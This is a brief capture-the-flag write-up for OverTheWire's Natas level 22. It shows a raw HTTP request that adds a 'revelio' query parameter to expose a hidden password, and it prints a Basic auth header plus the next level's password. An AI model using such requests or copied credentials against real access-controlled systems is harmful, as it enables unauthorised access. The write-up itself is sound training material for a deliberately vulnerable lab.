Website is blank; source code shows that if PHP superglobal $_GET contains the variable `revelio` then the next level password will be shown.

Main point here is that the PHP superglobal $_GET contains querystring parameters, so you need to add a revelio querystring parameter:
```
GET /?revelio=foo HTTP/1.1
Host: natas22.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyMjo5MWF3Vk05b0RpVUdtMzNKZHpNN1JWTEJTOGJ6OW4wcw==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Password for the next level is `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`.
